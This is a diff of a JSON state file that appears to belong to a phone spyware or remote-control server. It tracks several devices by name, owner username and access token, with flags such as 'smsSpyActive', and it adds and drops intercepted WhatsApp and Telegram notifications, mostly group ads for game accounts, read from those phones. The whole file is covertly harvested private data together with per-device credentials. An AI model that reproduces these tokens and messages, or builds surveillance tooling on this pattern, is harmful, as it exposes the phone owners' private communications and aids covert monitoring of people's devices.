@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776768533225,
+    "lastSeen": 1776768542233,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -5259,6 +5259,22 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (438 pesan): ~ 𝐈𝐆: 𝐒𝐀𝐍𝐙 𝐒𝐓𝐎𝐑𝐄",
+        "content": "📷 920k NIH SG OPM+TEROMPET MAX2 TW MAX4 VAULT 599 PRIME5 TINGGAL TOP UP NAIK PRIME6 ALL AMAN ENJEL MERAH ON ENJEL BIRU CEWE ON ALL AMAN FULL SPEK PM AJA OPEN, TT/BT ASAL SIAP RUGI",
+        "time": "21/04 17:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776768542417
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3853 pesan dari 21 chat",
+        "time": "21/04 17:49",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776768542404
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎JB || RULZ STORE KALBAR (602 pesan): ~ Xell",
         "content": "📷 Op 130k\nBind sepaket no lengket\nfull Spek pm",
         "time": "21/04 17:48",
@@ -9240,22 +9256,6 @@
         "time": "21/04 17:25",
         "pkg": "com.whatsapp",
         "receivedAt": 1776767102768
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (425 pesan): ~ jall store",
-        "content": "GB 0.1 DAGET SETIAP JUM'AT +400MEM",
-        "time": "21/04 17:25",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776767102755
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎4279 pesan dari 22 chat",
-        "time": "21/04 17:25",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776767100401
       }
     ],
     "galleryPhotos": [],
@@ -9274,7 +9274,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776768534137,
+    "lastSeen": 1776768540162,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -9315,7 +9315,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776768532643,
+    "lastSeen": 1776768541586,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -9331,6 +9331,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Pesan baru",
+        "time": "21/04 17:48",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776768534683
+      },
       {
         "appName": "Telegram",
         "sender": "Telegram: Pengguna",
